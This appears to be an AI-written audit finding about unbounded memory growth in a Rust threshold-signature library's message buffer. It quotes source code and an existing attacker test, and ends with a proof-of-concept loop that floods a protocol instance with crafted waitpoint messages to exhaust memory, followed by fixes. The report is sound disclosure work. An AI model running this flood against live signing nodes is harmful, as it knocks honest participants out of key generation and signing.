The test at line 532 in `internal.rs` is the smoking gun — it literally documents the attack. Let me confirm the full picture before writing the report.### Title
Unbounded Memory Growth via Uncapped `Protocol::message()` Injection into `MessageBuffer` - (File: `src/protocol/internal.rs`)

---

### Summary

The `Protocol::message()` implementation in `ProtocolExecutor` forwards every incoming message unconditionally into an unbounded internal buffer (`MessageBuffer`). A malicious participant can call `message()` repeatedly with crafted messages targeting arbitrary or unused `MessageHeader` keys, causing the `HashMap<MessageHeader, SubMessageQueue>` to grow without bound, exhausting process memory. The codebase itself contains a test that explicitly confirms this attack path.

---

### Finding Description

Every protocol produced by `make_protocol()` implements the `Protocol` trait via `ProtocolExecutor`. The `message()` method is the sole external entry point for delivering network messages to a running protocol instance:

```rust
// src/protocol/internal.rs:512-514
fn message(&mut self, from: Participant, data: MessageData) {
    self.comms.push_message(from, data);
}
```

`push_message` parses a `MessageHeader` from the first 40 bytes of the payload and inserts the message into `MessageBuffer`:

```rust
// src/protocol/internal.rs:286-296
fn push_message(&self, from: Participant, message: MessageData) {
    if message.len() < MessageHeader::LEN {
        return;
    }
    let Some(header) = MessageHeader::from_bytes(&message) else {
        return;
    };
    self.incoming.push(header, from, message);
}
```

`MessageBuffer` is a `HashMap<MessageHeader, SubMessageQueue>`, where each `SubMessageQueue` is backed by a `futures::channel::mpsc::unbounded()` channel — a channel with **no capacity limit**:

```rust
// src/protocol/internal.rs:190-212
struct SubMessageQueue {
    sender: futures::channel::mpsc::UnboundedSender<(Participant, MessageData)>,
    receiver: Arc<Mutex<futures::channel::mpsc::UnboundedReceiver<...>>>,
}
impl Default for SubMessageQueue {
    fn default() -> Self {
        let (sender, receiver) = futures::channel::mpsc::unbounded();
        ...
    }
}
```

There are **two independent unbounded growth axes**:

1. **HashMap key explosion**: Each distinct `MessageHeader` (40-byte prefix = 32-byte channel tag + 8-byte waitpoint) creates a new `SubMessageQueue` entry. An attacker can craft messages with arbitrary waitpoints or channel tags, creating a new HashMap entry per message.
2. **Per-queue depth explosion**: Repeated messages with the same header are pushed into the same `UnboundedSender` with no backpressure or cap.

Neither `push_message` nor `MessageBuffer::push` applies any bound check, deduplication, or rate limit.

The codebase itself contains a test that explicitly demonstrates and asserts this behavior:

```rust
// src/protocol/internal.rs:530-554
fn attacker_can_fill_message_buffer_with_unused_waitpoints() {
    let comms = Comms::new();
    let attacker = Participant::from(99_u32);
    let attack_count = 512_u64;
    for i in 0..attack_count {
        let header = MessageHeader::new(ChannelTag::root_shared())
            .with_waitpoint(1_000_000 + i);
        let mut message = header.to_bytes().to_vec();
        message.extend_from_slice(&i.to_le_bytes());
        comms.push_message(attacker, message);
    }
    // Asserts the buffer grew to exactly attack_count entries — no rejection.
    assert!(messages.len() == usize::try_from(attack_count).unwrap());
}
```

The test name is `attacker_can_fill_message_buffer_with_unused_waitpoints` and it passes, confirming the buffer grows proportionally to attacker input with zero resistance.

---

### Impact Explanation

A malicious participant (or a compromised network relay) can call `Protocol::message()` in a tight loop with crafted 40-byte-prefixed payloads targeting unused waitpoints. Each call allocates a new `SubMessageQueue` (HashMap entry + unbounded channel allocation). With no cap, this drives the hosting process to OOM, permanently terminating the protocol for all honest participants. This matches the allowed impact:

> **Medium: Griefing or resource-exhaustion by a malicious caller or participant causing unbounded CPU, memory, bandwidth, or non-terminating work beyond documented behavior.**

Every protocol in the library — DKG, presign, sign, reshare, refresh, CKD — is built on `make_protocol` / `ProtocolExecutor` and is equally affected. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) 

---

### Likelihood Explanation

The `Protocol::message()` function is the **public API surface** that every integrator must call to deliver network messages. The network layer documentation explicitly states channels are authenticated (TLS), so the attacker identity is known — but authentication does not prevent a malicious participant from sending garbage payloads. Any participant in a DKG, signing, or CKD session can exploit this. The attack requires only the ability to send bytes to a peer running the protocol, which is the baseline capability of any protocol participant. [6](#0-5) [7](#0-6) 

---

### Recommendation

1. **Cap the HashMap size**: Reject `push_message` calls once the number of distinct `MessageHeader` keys exceeds a protocol-specific bound (e.g., `num_participants × num_rounds × small_constant`).
2. **Cap per-queue depth**: Replace `futures::channel::mpsc::unbounded()` with `futures::channel::mpsc::channel(BOUND)` and drop or error on overflow.
3. **Validate waitpoints**: In `push_message`, reject messages whose waitpoint exceeds the maximum waitpoint the protocol will ever use. Since waitpoints are allocated sequentially via `next_waitpoint()`, the maximum is statically knowable at protocol construction time.
4. **Per-sender accounting**: Track how many messages each `Participant` has injected and reject further messages once a per-sender cap is exceeded. [8](#0-7) [9](#0-8) 

---

### Proof of Concept

The following is a minimal reproduction (mirrors the existing internal test, callable from any integration context):

```rust
use threshold_signatures::protocol::{Protocol, MessageData};
use threshold_signatures::participants::Participant;

// Start any protocol, e.g., DKG keygen
let mut victim_protocol = keygen(&participants, me, threshold).unwrap();

let attacker = Participant::from(99u32);

// Craft messages with arbitrary unused waitpoints (bytes 32..40 of the header)
for i in 0u64..u64::MAX {
    let mut msg = vec![0u8; 40]; // 32-byte channel tag (zeros) + 8-byte waitpoint
    msg[32..40].copy_from_slice(&(1_000_000u64 + i).to_le_bytes());
    msg.extend_from_slice(b"payload");

    // Each call allocates a new HashMap entry + unbounded channel — no rejection
    victim_protocol.message(attacker, msg);
    // Memory grows by ~hundreds of bytes per iteration; OOM after millions of calls
}
// Protocol is now dead; honest parties can never complete DKG/sign/CKD
```

The existing test `attacker_can_fill_message_buffer_with_unused_waitpoints` in `src/protocol/internal.rs` at line 532 already asserts this succeeds for 512 iterations and can be trivially scaled to any count. [5](#0-4) [10](#0-9)

### Citations

**File:** src/protocol/internal.rs (L190-212)
```rust
struct SubMessageQueue {
    sender: futures::channel::mpsc::UnboundedSender<(Participant, MessageData)>,
    receiver: Arc<Mutex<futures::channel::mpsc::UnboundedReceiver<(Participant, MessageData)>>>,
}

impl SubMessageQueue {
    pub fn send(&self, from: Participant, message: MessageData) {
        // This cannot fail because the receiver is also alive.
        self.sender
            .unbounded_send((from, message))
            .expect("unbound_send should not fail");
    }
}

impl Default for SubMessageQueue {
    fn default() -> Self {
        let (sender, receiver) = futures::channel::mpsc::unbounded();
        Self {
            sender,
            receiver: Arc::new(Mutex::new(receiver)),
        }
    }
}
```

**File:** src/protocol/internal.rs (L222-239)
```rust
struct MessageBuffer {
    messages: Arc<std::sync::Mutex<HashMap<MessageHeader, SubMessageQueue>>>,
}

impl MessageBuffer {
    fn new() -> Self {
        Self {
            messages: Arc::new(std::sync::Mutex::new(HashMap::new())),
        }
    }

    /// Push a message into this buffer.
    ///
    /// We also need the header for the message, and the participant who sent it.
    fn push(&self, header: MessageHeader, from: Participant, message: MessageData) {
        let mut messages_lock = self.messages.lock().expect("lock should not fail");
        messages_lock.entry(header).or_default().send(from, message);
    }
```

**File:** src/protocol/internal.rs (L286-296)
```rust
    fn push_message(&self, from: Participant, message: MessageData) {
        if message.len() < MessageHeader::LEN {
            return;
        }

        let Some(header) = MessageHeader::from_bytes(&message) else {
            return;
        };

        self.incoming.push(header, from, message);
    }
```

**File:** src/protocol/internal.rs (L474-514)
```rust
impl<T> Protocol for ProtocolExecutor<T> {
    type Output = T;

    fn poke(&mut self) -> Result<Action<Self::Output>, ProtocolError> {
        let mut polled_once_already = false;
        loop {
            // If there's outgoing messages, request to send them.
            if let Some(outgoing) = self.comms.outgoing() {
                return Ok(match outgoing {
                    Message::Many(m) => Action::SendMany(m),
                    Message::Private(to, m) => Action::SendPrivate(to, m),
                });
            }
            // If we already have a return result, return it.
            if let Some(result) = self.result.take() {
                return Ok(Action::Return(result?));
            }
            // If this is the second iteration, we already polled the future and there's no
            // progress that can be made.
            if polled_once_already {
                return Ok(Action::Wait);
            }
            // If we don't have a future, this is an extraneous poke() call, so return Wait.
            let Some(fut) = self.fut.as_mut() else {
                return Ok(Action::Wait);
            };
            // Now poll the future. It may generate some more messages to send or a return value,
            // so go back and check all of those again.
            polled_once_already = true;
            let waker = noop_waker();
            let mut cx = Context::from_waker(&waker);
            if let std::task::Poll::Ready(result) = fut.poll_unpin(&mut cx) {
                self.result = Some(result);
                self.fut = None;
            }
        }
    }

    fn message(&mut self, from: Participant, data: MessageData) {
        self.comms.push_message(from, data);
    }
```

**File:** src/protocol/internal.rs (L530-554)
```rust
    #[test]
    #[allow(clippy::significant_drop_tightening)]
    fn attacker_can_fill_message_buffer_with_unused_waitpoints() {
        let comms = Comms::new();
        let attacker = Participant::from(99_u32);
        let attack_count = 512_u64;

        for i in 0..attack_count {
            let header =
                MessageHeader::new(ChannelTag::root_shared()).with_waitpoint(1_000_000 + i);
            let mut message = header.to_bytes().to_vec();
            message.extend_from_slice(&i.to_le_bytes());

            // Attacker injects messages for waitpoints the honest code never polls.
            comms.push_message(attacker, message);
        }

        let messages = comms
            .incoming
            .messages
            .lock()
            .expect("lock should not fail");

        assert!(messages.len() == usize::try_from(attack_count).unwrap());
    }
```

**File:** src/protocol/mod.rs (L51-64)
```rust
pub trait Protocol {
    type Output;

    /// Poke the protocol, receiving a new action.
    ///
    /// The idea is that the protocol should be poked until it returns an error,
    /// or it returns an action with a return value, or it returns a wait action.
    ///
    /// Upon returning a wait action, that protocol will not advance any further
    /// until a new message arrives.
    fn poke(&mut self) -> Result<Action<Self::Output>, ProtocolError>;

    /// Inform the protocol of a new message.
    fn message(&mut self, from: Participant, data: MessageData);
```

**File:** docs/network-layer.md (L8-15)
```markdown

- **Authenticated Channels:** All messages are sent over authenticated channels. Senders' identities are always verifiable.
- **Confidentiality for Private Messages:** Channels used for private messages (`send_private`) must be encrypted.

<details>
  <summary>Practical Implementation</summary>
  In practice, we satisfy both requirements by running all protocols over a network where participants are connected via a TLS channel. This ensures both, authentication and confidentiality.
</details>
```
